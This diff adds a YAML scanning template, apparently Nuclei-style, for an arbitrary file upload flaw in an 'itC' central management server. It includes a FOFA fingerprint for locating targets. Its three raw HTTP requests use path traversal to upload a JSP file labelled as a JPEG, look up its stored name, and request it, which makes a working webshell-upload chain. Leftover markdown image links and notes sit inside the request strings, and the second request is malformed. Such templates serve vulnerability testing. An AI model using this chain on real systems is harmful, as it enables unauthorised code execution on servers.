@@ -1,0 +1,83 @@
+id: poc-ahi3tzu5pehuxmse
+info:
+  name: itC 中心管理服务器 actionDetailTmpFile存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ahi3tzu5pehuxmse'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ahi3tzu5pehuxmse
+    fofa: body="/mt_res_v3/img/public/logo.ico"
+http:
+- raw:
+  - 'POST /sdk/../photoAds/actionDetailTmpFile.do?text=1&pa_id=11&position=11 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Accept: */*
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="test.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <%= "hello" %>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1786373128156-258033ad-bfe3-451a-b414-4c4203a20cb9.png)
+
+    根据参数pa_id获取上传的文件名'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /sdk/../photoAds/actionDetailTmpList.do?pa_id=11 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Length: 64![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1786373128412-cc3dccfb-aff0-416d-844f-8a98aa4c12d2.png)
+
+    访问上传文件的路径'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /photo_ads/a8a9d123-9d98-4cd2-9cad-31c88f4cb3c2.jsp HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
